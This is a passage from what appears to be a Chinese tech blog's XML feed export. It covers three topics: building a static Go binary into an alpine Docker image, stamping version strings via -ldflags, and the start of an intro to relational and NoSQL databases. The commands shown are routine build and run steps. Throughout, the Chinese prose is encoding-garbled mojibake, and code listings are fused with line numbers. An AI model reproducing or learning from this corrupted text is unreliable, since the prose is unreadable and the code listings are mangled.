cgoÂèÇÊï∞Go1.5ÁâàÊú¨‰πãÂâçÔºåGoÈáåÈù¢ÁöÑ‰∏Ä‰∫õÂ∫ìÂáΩÊï∞ÊòØÁî®CÂÆûÁé∞ÁöÑ(ÁΩëÁªúÊñπÈù¢ÁöÑÂ±ÖÂ§ö), ‰πüÂ∞±ÊòØCGO„ÄÇÂ¶ÇÊûú‰Ω†ÁöÑ‰ª£Á†Å‰∏≠‰ΩøÁî®‰∫ÜËøô‰∫õCÂÆûÁé∞ÁöÑÂ∫ìÂáΩÊï∞ÔºåÈÇ£‰Ω†Â∞±Ë¶ÅÂä†‰∏ä-installsuffix cgoËøô‰∏™ÂèÇÊï∞ÔºåËÆ©ÂÆÉÁºñËØëÁöÑÊó∂ÂÄôÂéªCGOÈáåÈù¢ÊâæÔºåÂê¶ÂàôÁºñËØëÊó∂‰ºöÊä•Èîô„ÄÇ‰ΩÜÊòØGo1.5ÁâàÊú¨ÂºÄÂßãÂÆûÁé∞‰∫ÜËá™‰∏æÔºåÊâÄÊúâÁöÑÊ†áÂáÜÂ∫ìÈÉΩÊòØÁî®Go‰ª£Á†ÅÂÆûÁé∞ÔºåÂ∞±‰∏çÂ≠òÂú®Ëøô‰∏™ÈóÆÈ¢ò‰∫Ü„ÄÇÊâÄ‰ª•ÔºåÂ¶ÇÊûú‰Ω†ÁöÑGoÁâàÊú¨ÊòØ1.5‰πãÂâçÁöÑÔºåÊúÄÂ•ΩÂä†‰∏äËøô‰∏™ÂèÇÊï∞ÔºåÂΩìÁÑ∂Â¶ÇÊûú‰Ω†ÁöÑ‰ª£Á†Å‰∏≠Ê≤°Áî®‰ΩøÁî®CÂÆûÁé∞ÁöÑÂ∫ìÔºåÈÇ£‰∏çÂä†‰πü‰∏ç‰ºöÊä•Èîô„ÄÇÂ¶ÇÊûú‰Ω†ÁöÑGoÊòØ1.5Âèä‰πãÂêéÁöÑÁâàÊú¨ÔºåÂ∞±‰∏çÈúÄË¶ÅÂÜçÂä†Ëøô‰∏™ÂèÇÊï∞‰∫Ü„ÄÇ ÂÖ≥‰∫éCGO_ENABLED=0ÂèÇÊï∞CGO_ENABLED=0Ë°®Á§∫ÈùôÊÄÅÁºñËØëcgo, ‰∏ç‰ºölinkÁ≥ªÁªü‰∏äÁöÑ‰∏Ä‰∫õÂä®ÊÄÅÈìæÊé•Â∫ì, Â¶ÇÊûúÊÉ≥Ë¶ÅÁºñËØëÁöÑ‰∫åËøõÂà∂ÂåÖÊ≠£Âú®Êó†‰æùËµñ, ËøôÈúÄË¶ÅÁ¶ÅÁî®CGO Êúâ‰∫Ü‰∏äÈù¢2ÁÇπ, Êàë‰ª¨‰∏ÄËà¨‰ºöËøôÊ†∑buildÊàë‰ª¨ÁöÑÁ®ãÂ∫è:1234# Â¶ÇÊûúGolang&lt;1.5CGO_ENABLED=0 GOOS=linux go build -a -v -installsuffix cgo -o app .# Â¶ÇÊûúGolang&gt;1.5CGO_ENABLED=0 GOOS=linux go build -a -v -o app . 12maojun@maojun-mbp $ du -sh app5.8M app ËøôÊ†∑Êàë‰ª¨Â∞±ÁºñËØëÂ•Ω‰∫Ü‰∏Ä‰∏™0‰æùËµñÁöÑ‰∫åËøõÂà∂ÂåÖ, ÊâìÂá∫Êù•ÁöÑÂåÖ5.8M, Êé•‰∏ãÊù•Êàë‰ª¨Â∞ÜÂü∫‰∫éÂÆÉÂà∂ÈÄ†dockerÈïúÂÉè„ÄÇ Â¶Ç‰ΩïÈÄâÊã©ÈïúÂÉèÁöÑBase‰æùËµñÂú®ÈÄâÊã©Êàë‰ª¨ÊâìÂåÖÂ•ΩÁöÑ‰∫åËøõÂà∂ÂåÖÁöÑËøêË°å‰æùËµñÊó∂, Êàë‰∏ÄËà¨‰ºöÊúâËøô3ÁßçËÄÉËôë: scratch: ÂÆÉÊòØ‰∏Ä‰∏™ÁâπÊÆäÁöÑÈïúÂÉè, Âõ†‰∏∫ÂÆÉÊòØ‰∏Ä‰∏™Á©∫ÈïúÂÉè„ÄÇ‰ΩÜÊòØÂÆÉÂç¥ÊòØÈùûÂ∏∏ÈáçË¶Å„ÄÇÊàë‰ª¨Áü•ÈÅìDockerfileÊñá‰ª∂ÂøÖÈ°ª‰ª•FROMÂºÄÂ§¥Ôºå‰ΩÜÂ¶ÇÊûúÊàë‰ª¨ÁöÑÈïúÂÉèÁúüÁöÑÊòØ‰∏ç‰æùËµñ‰ªª‰ΩïÂÖ∂‰ªñ‰∏úË•øÁöÑÊó∂ÂÄôÔºåÊàë‰ª¨Â∞±ÂèØ‰ª•FROM scratch„ÄÇÂú®Docker 1.5.0‰πãÂêéÔºåFROM scratchÂ∑≤ÁªèÂèòÊàê‰∏Ä‰∏™Á©∫Êìç‰Ωú(no-op)Ôºå‰πüÂ∞±ÊòØËØ¥ÂÆÉ‰∏ç‰ºöÂÜçÂçïÁã¨Âç†‰∏ÄÂ±Ç‰∫Ü, ÂΩìÁÑ∂‰æùËµñËøôÂ±ÇÁöÑÂ§ßÂ∞è‰πüÂ∞±‰∏∫0‰∫Ü, Âõ†Ê≠§Âü∫‰∫éÊ≠§ÂèØ‰ª•ÊûÑÂª∫ÊúÄÂ∞èÈïúÂÉè„ÄÇ alpine: Alpine LinuxÊòØ‰∏Ä‰∏™Á§æÂå∫ÂºÄÂèëÁöÑÈù¢ÂêëÂÆâÂÖ®Â∫îÁî®ÁöÑËΩªÈáèÁ∫ßLinuxÂèëË°åÁâà, ÈÄÇÂêàÁî®Êù•ÂÅöDockerÈïúÂÉè„ÄÅË∑ØÁî±Âô®„ÄÅÈò≤ÁÅ´Â¢ô„ÄÅVPNs„ÄÅVoIP ÁõíÂ≠ê ‰ª•ÂèäÊúçÂä°Âô®ÁöÑÊìç‰ΩúÁ≥ªÁªüÔºåÂü∫‰∫éuClibcÂíåBusybox, Â§ßÂ∞èÂè™Êúâ3.97M„ÄÇ ubuntu: Ëøô‰∏™‰∏çÁî®Â§öÂÅö‰ªãÁªç‰∫Ü, Â¶ÇÊûú‰Ω†‰ø°‰∏çËøáalpineËøô‰πüÁÆó‰∏Ä‰∏™‰∏çÈîôÁöÑÈÄâÊã©, ubuntu16.04ÁöÑÈïúÂÉèÂ§ßÂ∞è‰∏∫128M„ÄÇ Êàë‰ª¨ÈÄâÊã©alpine‰Ωú‰∏∫base‰æùËµñ, Âõ†‰∏∫ÂÆÉË∂≥Â§üÂ∞è, ËÄå‰∏îÊòØ‰∏Ä‰∏™linux, ÊúâshellÁéØÂ¢É, ‰ª•Â§áÊúâÊó∂ÈúÄË¶ÅËøõÂÖ•ÂÆπÂô®„ÄÇÂÆåÊï¥ÁöÑDockerfileÂ¶Ç‰∏ã:12345FROM alpine:latestADD app /CMD ["/app"] ÊúÄÁªàÈïúÂÉèÂ§ßÂ∞èÂü∫‰∫éÂàöÊâçÂÜôÂ•ΩÁöÑdockerfileËøõË°åbuild:123456789101112 maojun@maojun-mbp $ docker build -t app:v0.0.1 .Sending build context to Docker daemon 6.094MBStep 1/3 : FROM alpine:latest ---&gt; 053cde6e8953Step 2/3 : ADD app / ---&gt; 765750f573f1Step 3/3 : CMD /app ---&gt; Running in cb62cfd2ad1e ---&gt; 188a3189d4f8Removing intermediate container cb62cfd2ad1eSuccessfully built 188a3189d4f8Successfully tagged app:v0.0.1 buildÂá∫Êù•ÁöÑimageÂ§ßÂ∞è:1app v0.0.1 188a3189d4f8 2 minutes ago 10.1MB ÊúÄÂêéÊàë‰ª¨ÊµãËØï‰∏ãbuildÁöÑÈïúÂÉèÊòØÂê¶ÂèØ‰ª•Ê≠£Â∏∏‰ΩøÁî®:1234567 maojun@maojun-mbp $ docker run -itd -p 8080:8080 app:v0.0.19fe96a7868679f8be4e34905755dcd93343a70b9a0424791de2482647e69b2d8 maojun@maojun-mbp $ docker psCONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES9fe96a786867 app:v0.0.1 "/app" 4 seconds ago Up 2 seconds 0.0.0.0:8080-&gt;8080/tcp hungry_kilby maojun@maojun-mbp $ curl localhost:8080hello world!% ÊúÄÁªàÈïúÂÉèÂ§ßÂ∞è: 10.1M, Âπ∂‰∏îÂ∏¶Êúâshell, Â¶ÇÊûú‰Ω†‰ΩøÁî®scratchÊûÑÂª∫‰º∞ËÆ°Âè™Êúâ6MÂ§öÁÇπ, ‰ΩÜÊòØÂÆûÁî®ÊÄßÂèØËÉΩ‰ºöÊúâÊâÄÈôç‰Ωé„ÄÇ]]></content>
      <categories>
        <category>ÂºÄÂèëËØ≠Ë®Ä</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>build</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[GolangÁ®ãÂ∫èÁâàÊú¨ÁÆ°ÁêÜ]]></title>
    <url>%2F2017%2F11%2F19%2Fgolang-cli-version%2F</url>
    <content type="text"><![CDATA[È°πÁõÆÂú®ÂÆåÊàêÂêéÂæÄÂæÄÈÉΩÈúÄË¶ÅÁâàÊú¨Âåñ, ËÄåGolangÈ°πÁõÆÂæÄÂæÄ‰∫§‰ªòÁöÑÊòØÁºñËØëËøáÂêéÁöÑ‰∫åËøõÂà∂ÂåÖ, Â¶Ç‰ΩïÈÄöËøá‰∫åËøõÂà∂ÂåÖÁü•ÈÅìÈ°πÁõÆÁöÑÁâàÊú¨, Â∞±ÂÉèdockerÁöÑversionÂëΩ‰ª§‰∏ÄÊ†∑Ê•†? ‰∏∫‰ªÄ‰πàÈúÄË¶ÅÁâàÊú¨ÁÆ°ÁêÜÁâàÊú¨ÁÆ°ÁêÜ‰∏ªË¶ÅÁî®‰∫éÂØπËøêË°åÁ®ãÂ∫èÁöÑÁâàÊú¨ËøΩË∏™,‰ªéËÄåÂèØ‰ª•ÁÆ°ÁêÜÁ∫ø‰∏äÊúçÂä°ÁöÑËøêË°åÁâàÊú¨,ÈÅøÂÖçÂêÑ‰∏™ÁâàÊú¨ÁöÑÊúçÂä°Á®ãÂ∫èÊ∑∑Ê∑Ü.ËøôÈáåÈÄöÂ∏∏ÁöÑÂÅöÊ≥ï‰∏∫Âú®Á®ãÂ∫è‰∏≠ÂüãÂÖ•ÁâàÊú¨Ê†áÂøó,ÂêåÊó∂ËØ•ÁâàÊú¨Âè∑‰ºöÂØπÂ∫îÂà∞git‰∏äÁöÑtagÊàñreleaseÁâàÊú¨.‰ªéËÄåÂØπÁ∫ø‰∏äÊúçÂä°Êõ¥ÊîπÊúâ‰∏Ä‰∏™Êõ¥ÂÖ®Èù¢ÁöÑ‰ø°ÊÅØËØ¥Êòé„ÄÇ ÊØîÂ¶ÇdockerÁöÑÁâàÊú¨‰ø°ÊÅØ:123456789 maojun@maojun-mbp $ docker versionClient: Version: 17.09.0-ce API version: 1.32 Go version: go1.8.3 Git commit: afdb6d4 Built: Tue Sep 26 22:40:09 2017 OS/Arch: darwin/amd64... GUNÈ£éÊ†ºÁâàÊú¨ÂëΩÂêçÊñπÂºèÂíåËßÑÂàôËøôÈáåÂ∞Ü‰ªãÁªçÂü∫‰∫éGNUÈ£éÊ†ºÁöÑ‰∏ÄÁßçÁâàÊú¨ÂëΩÂêçÊñπÂºè, Ëøô‰πüÊòØÂΩì‰ªä‰∏ªÊµÅÁöÑÁâàÊú¨ÂëΩÂêçÊñπÂºè, ÂæàÂ§öÂºÄÊ∫êÈ°πÁõÆÁöÑÁâàÊú¨ÂëΩÂêçÈÉΩÈÅµÂæ™Ê≠§È£éÊ†º„ÄÇGUNÈ£éÊ†ºÁâàÊú¨ÂëΩÂêçÈ£éÊ†º:123Major_Version_Number.Minor_Version_Number[.Revision_Number[.Build_Number]] ‰∏ªÁâàÊú¨Âè∑.Â≠êÁâàÊú¨Âè∑[.‰øÆÊ≠£ÁâàÊú¨Âè∑[.ÁºñËØëÁâàÊú¨Âè∑]]Á§∫‰æã : 1.2.1, 2.0, 5.0.0.build-13124 Major: ÂÖ∑ÊúâÁõ∏ÂêåÂêçÁß∞‰ΩÜ‰∏çÂêå‰∏ªÁâàÊú¨Âè∑ÁöÑÁ®ãÂ∫èÈõÜ‰∏çÂèØ‰∫íÊç¢„ÄÇ‰æãÂ¶ÇÔºåËøôÈÄÇÁî®‰∫éÂØπ‰∫ßÂìÅÁöÑÂ§ßÈáèÈáçÂÜôÔºåËøô‰∫õÈáçÂÜô‰ΩøÂæóÊó†Ê≥ïÂÆûÁé∞ÂêëÂêéÂÖºÂÆπÊÄß„ÄÇ Minor: Â¶ÇÊûú‰∏§‰∏™Á®ãÂ∫èÈõÜÁöÑÂêçÁß∞Âíå‰∏ªÁâàÊú¨Âè∑Áõ∏ÂêåÔºåËÄåÊ¨°ÁâàÊú¨Âè∑‰∏çÂêåÔºåËøôÊåáÁ§∫ÊòæËëóÂ¢ûÂº∫Ôºå‰ΩÜÁÖßÈ°æÂà∞‰∫ÜÂêëÂêéÂÖºÂÆπÊÄß„ÄÇ‰æãÂ¶ÇÔºåËøôÈÄÇÁî®‰∫é‰∫ßÂìÅÁöÑ‰øÆÊ≠£ÁâàÊàñÂÆåÂÖ®ÂêëÂêéÂÖºÂÆπÁöÑÊñ∞ÁâàÊú¨„ÄÇ Revision: ÂêçÁß∞„ÄÅ‰∏ªÁâàÊú¨Âè∑ÂíåÊ¨°ÁâàÊú¨Âè∑ÈÉΩÁõ∏Âêå‰ΩÜ‰øÆËÆ¢Âè∑‰∏çÂêåÁöÑÁ®ãÂ∫èÈõÜÂ∫îÊòØÂÆåÂÖ®ÂèØ‰∫íÊç¢ÁöÑ„ÄÇËøôÈÄÇÁî®‰∫é‰øÆÂ§ç‰ª•ÂâçÂèëÂ∏ÉÁöÑÁ®ãÂ∫èÈõÜ‰∏≠ÁöÑÂÆâÂÖ®ÊºèÊ¥û„ÄÇ Build: ÂÜÖÈÉ®ÁâàÊú¨Âè∑ÁöÑ‰∏çÂêåË°®Á§∫ÂØπÁõ∏ÂêåÊ∫êÊâÄ‰ΩúÁöÑÈáçÊñ∞ÁºñËØë„ÄÇËøôÈÄÇÂêà‰∫éÊõ¥ÊîπÂ§ÑÁêÜÂô®„ÄÅÂπ≥Âè∞ÊàñÁºñËØëÂô®ÁöÑÊÉÖÂÜµ„ÄÇ ÁâàÊú¨Âè∑ÁöÑÂèòÂåñ‰∏ÄËà¨ÈÅµÂæ™Â¶Ç‰∏ãËßÑÂàô: È°πÁõÆÂàùÁâàÊú¨ : ÁâàÊú¨Âè∑ÂèØ‰ª•‰∏∫ 0.1 Êàñ 0.1.0, ‰πüÂèØ‰ª•‰∏∫ 1.0 Êàñ 1.0.0. ‰øÆÊ≠£ÁâàÊú¨Âè∑Â¢ûÂä†: ÂΩìÈ°πÁõÆÂú®ËøõË°å‰∫ÜÂ±ÄÈÉ®‰øÆÊîπÊàñ bug ‰øÆÊ≠£Êó∂Ôºå‰∏ªÁâàÊú¨Âè∑ÂíåÂ≠êÁâàÊú¨Âè∑ÈÉΩ‰∏çÂèò,‰øÆÊ≠£ÁâàÊú¨Âè∑Âä†1. Â≠êÁâàÊú¨Âè∑Â¢ûÂä† : ÂΩìÈ°πÁõÆÂú®ÂéüÊúâÁöÑÂü∫Á°Ä‰∏äÂ¢ûÂä†‰∫ÜÈÉ®ÂàÜÂäüËÉΩÊó∂Ôºå‰∏ªÁâàÊú¨Âè∑‰∏çÂèòÔºåÂ≠êÁâàÊú¨Âè∑Âä† 1Ôºå‰øÆÊ≠£ÁâàÊú¨Âè∑Â§ç‰Ωç‰∏∫ 0ÔºåÂõ†ËÄåÂèØ‰ª•Ë¢´ÂøΩÁï•Êéâ. ‰∏ªÁâàÊú¨Âè∑Â¢ûÂä† : ÂΩìÈ°πÁõÆÂú®ËøõË°å‰∫ÜÈáçÂ§ß‰øÆÊîπÊàñÂ±ÄÈÉ®‰øÆÊ≠£Á¥ØÁßØËæÉÂ§öÔºåËÄåÂØºËá¥È°πÁõÆÊï¥‰ΩìÂèëÁîüÂÖ®Â±ÄÂèòÂåñÊó∂. ÁºñËØëÁâàÊú¨Âè∑ÂèòÂåñ : ÁºñËØëÁâàÊú¨Âè∑‰∏ÄËà¨ÊòØÁºñËØëÂô®Âú®ÁºñËØëËøáÁ®ã‰∏≠Ëá™Âä®ÁîüÊàêÁöÑÔºåÊàë‰ª¨Âè™ÂÆö‰πâÂÖ∂Ê†ºÂºèÔºåÂπ∂‰∏çËøõË°å‰∫∫‰∏∫ÊéßÂà∂ Â¶Ç‰ΩïÂüãÂÖ•ÁâàÊú¨‰ø°ÊÅØÂÜôC/C++‰ª£Á†ÅÊó∂ÔºåÂèØ‰ª•Âú®‰ª£Á†Å‰∏≠È¢ÑÂÆö‰πâ‰∏Ä‰∫õÁâàÊú¨ÂÆèÂÆö‰πâÔºåÁÑ∂ÂêéÂÜçÁºñËØëÊó∂‰ªéÂ§ñÈÉ®‰º†ÂÖ•Êï∞ÊçÆ‰Ωú‰∏∫ÁâàÊú¨Âè∑, golang‰ª£Á†Å‰∏çÊîØÊåÅÂÆèÂÆö‰πâ, ‰ΩÜÊòØgo buildÊó∂Êèê‰æõ‰∫Ü‰∏Ä‰∏™‰∏é‰πãÁõ∏‰ººÁöÑÂäüËÉΩÂèÇÊï∞:12-ldflags 'flag list' arguments to pass on each go tool link invocation. ÁÑ∂ÂêéÊü•Áúãgo tool linkÁöÑÁõ∏ÂÖ≥ÊñáÊ°£:1234-X importpath.name=value Set the value of the string variable in importpath named name to value. Note that before Go 1.5 this option took two separate arguments. Now it takes one argument split on the first = sign. ÊåâÁÖßÊñáÊ°£‰∏≠ÁöÑËØ¥ÊòéÂ∫îËØ•ÊòØÂú®buildÊó∂ÔºåÈÄöËøá-ldflagsËÆæÂÆölinkerÁöÑÂèÇÊï∞„ÄÇ ÁÑ∂ÂêéÂÜçÈÄöËøálinkerÁöÑ-XÊù•‰øÆÊîπÊåáÂÆöË∑ØÂæÑ‰∏ãÈù¢ÁöÑÂèòÈáèÂÄº12345678910111213package main import ( "fmt") var ( VERSION) func main() &#123; fmt.Printf("Version:[%s]\n", VERSION)&#125; ÁºñËØëÊó∂‰º†ÂÖ•ÂèòÈáè:123$ go build -ldflags "-X main.VERSION=v1.0.0-alpha1" main.go$ ./mainVersion:[v1.0.0-alpha1] ÊúÄÁªàÊ†∑‰æãÂ¶ÇÊûúÊàë‰ª¨Áõ¥Êé•Âú®È°πÁõÆÂÖ•Âè£Êñá‰ª∂Â§ÑÂüãÂÖ•ÁâàÊú¨‰ø°ÊÅØ, ÂØπÈ°πÁõÆÂÖ•Âè£‰æµÂÖ•Â§™Â§ß, Âõ†Ê≠§‰Ω†‰ºöÁúãÂà∞‰∏Ä‰∫õÂ•ΩÁöÑÂºÄÊ∫êÈ°πÁõÆ‰∏ãÈÉΩÊúâ‰∏Ä‰∏™‰∏ìÈó®ÁöÑversionÂåÖ, Áî±ÂÆÉÊù•Ë¥üË¥£Êé•Êî∂ÂüãÂÖ•ÁöÑÁâàÊú¨‰ø°ÊÅØ„ÄÇ ÊúÄÁªàÁ§∫‰æãËØ∑ÂèÇËÄÉ: GolangÁ®ãÂ∫èÁâàÊú¨ÁÆ°ÁêÜ‰ª£Á†ÅÁ§∫‰æã123456 maojun@maojun-mbp $ ./version-example -vVersion : v0.0.1-alpha.0Build Time: 2017-11-19 23:28:12Git Branch: masterGit Commit: 83de09af3f96007726edd5b308ed989476b9f358Go Version: go1.9 linux/amd64]]></content>
      <categories>
        <category>ÂºÄÂèëËØ≠Ë®Ä</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>build</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Êï∞ÊçÆÂ∫ìÂàÜÁ±ª‰ª•ÂèäNoSQL‰ªãÁªç]]></title>
    <url>%2F2017%2F11%2F05%2Fmongodb-introduce%2F</url>
    <content type="text"><![CDATA[Áî±‰∫éÈ°πÁõÆÈúÄË¶ÅÂ≠òÂÇ®‰∏Ä‰∫õÊó†ÁªìÊûÑÁöÑÊï∞ÊçÆ, Ëøô‰∫õÊï∞ÊçÆ‰∏ªË¶Å‰ª•ÊñáÊú¨‰∏∫‰∏ª, ÂêåÊó∂ËøòÈúÄÊîØÊåÅ‰∏Ä‰∫õÊñáÊú¨ÂàÜÊûê, Âíã‰∏ÄÂê¨‰ºº‰πéESÊòØ‰∏Ä‰∏™‰∏çÈîôÁöÑÈÄâÊã©, ‰ΩÜÊòØËøô‰∫õÊó†ÁªìÊûÑÁöÑÊï∞ÊçÆÂêåÊó∂‰πüÈúÄË¶ÅË¢´ÁÆ°ÁêÜ, ‰πüÂ∞±ÊòØËøô‰∫õÊï∞ÊçÆÂèØËÉΩÁªèÂ∏∏ÂèòÊõ¥, Ë°°ÈáèÂÜç‰∏â, ÊúÄÂêéËøòÊòØÈÄâÊã©‰∫ÜMongo, ÊØïÁ´üÁé∞Èò∂ÊÆµÊòØ‰ª•Êï∞ÊçÆÁöÑÂ≠òÂÇ®ÂíåÁÆ°ÁêÜ‰∏∫‰∏ª, ÂàÜÊûêÂπ∂Ê≤°ÊúâÈÇ£‰πàÂº∫ÁöÑÈúÄÊ±Ç„ÄÇÊï¥ÁØáÊñáÁ´†‰ª•Â§ßÊï∞ÊçÆÂ≠òÂÇ®ÈóÆÈ¢ò‰∏∫Âºï, ‰∏ÄÊ≠•Ê≠•ÂºïÂá∫NoSQLÈ¢ÜÂüüÊñáÊ°£Êï∞ÊçÆÁöÑ‰ª£Ë°®MongoDB„ÄÇ Â§ßÊï∞ÊçÆÂ≠òÂÇ®ÈóÆÈ¢òE.F.CoddÂú®1970Âπ¥È¶ñÊ¨°ÊèêÂá∫‰∫ÜÊï∞ÊçÆÂ∫ìÁ≥ªÁªüÁöÑÂÖ≥Á≥ªÊ®°ÂûãÔºå‰ªéÊ≠§ÂºÄÂàõ‰∫ÜÊï∞ÊçÆÂ∫ìÂÖ≥Á≥ªÊñπÊ≥ïÂíåÂÖ≥Á≥ªÊï∞ÊçÆÁêÜËÆ∫ÁöÑÁ†îÁ©∂Ôºå‰∏∫Êï∞ÊçÆÂ∫ìÊäÄÊúØÂ•†ÂÆö‰∫ÜÁêÜËÆ∫Âü∫Á°ÄÔºåÊï∞ÊçÆÂ∫ìÊäÄÊúØ‰πüÂºÄÂßãËì¨ÂãÉÂèëÂ±ï„ÄÇËÄåÈöèÁùÄÂá†Â§ßÊï∞ÊçÆÂ∫ìÂéÇÂïÜÈôÜÁª≠ÂèëÂ∏ÉÁöÑÂïÜ‰∏öÊï∞ÊçÆÂ∫ìÁÆ°ÁêÜÁ≥ªÁªüÂá†‰πéÈÉΩÊîØÊåÅÂÖ≥Á≥ªÊï∞ÊçÆÊ®°ÂûãÔºåÊï∞ÊçÆÂ∫ìÊäÄÊúØÈÄêÊ∏êÁªü‰∏ÄÂà∞‰ª•ÂÖ≥Á≥ªÂûãÊï∞ÊçÆÂ∫ì‰∏∫‰∏ªÂØº„ÄÇÂÖ≥Á≥ªÊ®°ÂûãÊúâÊâéÂÆûÁöÑÊï∞Â≠¶ÁêÜËÆ∫ÂÅöÂü∫Á°Ä, Âπ∂‰∏îÁªèËøáÈïøÊó∂Èó¥ÁöÑÂÆûË∑µ, ‰ΩøÂæóÂÖ∂Âú®Êï∞ÊçÆÂ≠òÂÇ®‰∏éÁÆ°ÁêÜÈ¢ÜÂüüÂç†ÊçÆÁªüÊ≤ªÂú∞‰Ωç„ÄÇ 2001Âπ¥ÂêéÔºå‰∫íËÅîÁΩëÊäÄÊúØËøÖÈÄüÂèëÂ±ïÔºåÊï∞ÊçÆÈáèËøÖÈÄüËÜ®ËÉÄÂπ∂Âπ∂Â§ßÔºå‰∫∫Á±ªÈÄêÊ≠•ËøõÂÖ•Â§ßÊï∞ÊçÆÊó∂‰ª£„ÄÇÂ§ßÊï∞ÊçÆÁªô‰º†ÁªüÁöÑÊï∞ÊçÆÁÆ°ÁêÜÊñπÂºèÂ∏¶Êù•‰∫Ü‰∏•Â≥ªÁöÑÊåëÊàòÔºåÂÖ≥Á≥ªÂûãÊï∞ÊçÆÂ∫ìÂú®ÂÆπÈáèÔºåÊÄßËÉΩÔºåÊàêÊú¨Á≠âÂ§öÊñπÈù¢ÈÉΩÈöæ‰ª•Êª°Ë∂≥Â§ßÊï∞ÊçÆÁÆ°ÁêÜÁöÑÈúÄÊ±Ç„ÄÇNoSQLÊï∞ÊçÆÂ∫ìÈÄöËøáÊäò‰∏≠ÂÖ≥Á≥ªÂûãÊï∞ÊçÆÂ∫ì‰∏•Ê†ºÁöÑÊï∞ÊçÆ‰∏ÄËá¥ÊÄßÁÆ°ÁêÜÔºåÂú®ÂèØÊâ©Â±ïÊÄß„ÄÅÊ®°ÂûãÁÅµÊ¥ªÊÄß„ÄÅÁªèÊµéÊÄßÂíåËÆøÈóÆÊÄßÁ≠âÊñπÈù¢Ëé∑Âæó‰∫ÜÂæàÂ§ßÁöÑ‰ºòÂäøÔºåÂèØ‰ª•Êõ¥Â•ΩÂú∞ÈÄÇÂ∫îÂ§ßÊï∞ÊçÆÂ∫îÁî®ÁöÑÈúÄÊ±ÇÔºåÊàê‰∏∫Â§ßÊï∞ÊçÆÊó∂‰ª£ÊúÄÈáçË¶ÅÁöÑÊï∞ÊçÆÁÆ°ÁêÜÊäÄÊúØ„ÄÇ Âõ¥ÁªïÂ§ßÊï∞ÊçÆÁöÑÂ≠òÂÇ®ÈóÆÈ¢ò, Êàë‰ª¨‰æùÊ¨°ËÆ®ËÆ∫‰∏ãÊï∞ÊçÆÂ∫ìÁöÑÂá†Â§ßÂàÜÁ±ª: RDBMS, NewSQL, NoSQL„ÄÇ RDBMSÂú®Áé∞‰ª£ÁöÑËÆ°ÁÆóÁ≥ªÁªü‰∏äÊØèÂ§©ÁΩëÁªú‰∏äÈÉΩ‰ºö‰∫ßÁîüÂ∫ûÂ§ßÁöÑÊï∞ÊçÆÈáè„ÄÇËøô‰∫õÊï∞ÊçÆÊúâÂæàÂ§ß‰∏ÄÈÉ®ÂàÜÊòØÁî±ÂÖ≥Á≥ªÊï∞ÊçÆÂ∫ìÁÆ°ÁêÜÁ≥ªÁªü(RDMBSs)Êù•Â§ÑÁêÜ„ÄÇ 1970Âπ¥ E.F.Codd‚ÄôsÊèêÂá∫ÁöÑÂÖ≥Á≥ªÊ®°ÂûãÁöÑËÆ∫Êñá ‚ÄúA relational model of data for large shared data banks‚ÄùÔºåËøô‰ΩøÂæóÊï∞ÊçÆÂª∫Ê®°ÂíåÂ∫îÁî®Á®ãÂ∫èÁºñÁ®ãÊõ¥Âä†ÁÆÄÂçï„ÄÇÈÄöËøáÂ∫îÁî®ÂÆûË∑µËØÅÊòéÔºåÂÖ≥Á≥ªÊ®°ÂûãÊòØÈùûÂ∏∏ÈÄÇÂêà‰∫éÂÆ¢Êà∑ÊúçÂä°Âô®ÁºñÁ®ãÔºåËøúËøúË∂ÖÂá∫È¢ÑÊúüÁöÑÂà©ÁõäÔºå‰ªäÂ§©ÂÆÉÊòØÁªìÊûÑÂåñÊï∞ÊçÆÂ≠òÂÇ®Âú®ÁΩëÁªúÂíåÂïÜÂä°Â∫îÁî®ÁöÑ‰∏ªÂØºÊäÄÊúØ„ÄÇ ‰ªÄ‰πàÊòØRDBMSÔºü RDBMSÂÖ®Áß∞ÊòØRelational Database Management System, ÂèäÂÖ≥Á≥ªÂûãÊï∞ÊçÆÁÆ°ÁêÜÁ≥ªÁªü, ‰ªñÈááÁî®ÂÖ≥Á≥ªÊ®°ÂûãÊù•Â≠òÂÇ®Êï∞ÊçÆ,ÂÖ≥Á≥ªÊ®°ÂûãÊòØÊääÂ§çÊùÇÁöÑÊï∞ÊçÆÁªìÊûÑÂΩíÁªì‰∏∫ÁÆÄÂçïÁöÑ‰∫åÂÖÉÂÖ≥Á≥ª(Âç≥‰∫åÁª¥Ë°®Ê†ºÂΩ¢Âºè), Âú®ÂÖ≥Á≥ªÂûãÊï∞ÊçÆÂ∫ì‰∏≠ÔºåÂØπÊï∞ÊçÆÁöÑÊìç‰ΩúÂá†‰πéÂÖ®ÈÉ®Âª∫Á´ãÂú®‰∏Ä‰∏™ÊàñÂ§ö‰∏™ÂÖ≥Á≥ªË°®Ê†º‰∏äÔºåÈÄöËøáÂØπËøô‰∫õÂÖ≥ËÅîÁöÑË°®Ê†ºÂàÜÁ±ª„ÄÅÂêàÂπ∂„ÄÅËøûÊé•ÊàñÈÄâÂèñÁ≠âËøêÁÆóÊù•ÂÆûÁé∞Êï∞ÊçÆÂ∫ìÁöÑÁÆ°ÁêÜ„ÄÇ ÂÖ≥Á≥ªÂûãÊï∞ÊçÆÁöÑÁâπÁÇπ(ACID) ÂÖ≥Á≥ªÂûãÊï∞ÊçÆÂ∫ìÈÅµÂæ™ACIDËßÑÂàô, ‰πüÂ∞±ÊòØÊàë‰ª¨Â∏∏ËØ¥ÁöÑ‰∫ãÁâ©Ê®°Âûã(transaction), ‰∫ãÁâ©Ëøô‰∏™Ê¶ÇÂøµÂíåÁé∞ÂÆû‰∏ñÁïå‰∏≠ÁöÑ‰∫§ÊòìÂæàÁ±ª‰ºº, ÂÆÉÊúâÂ¶Ç‰∏ã4‰∏™ÁâπÊÄß: 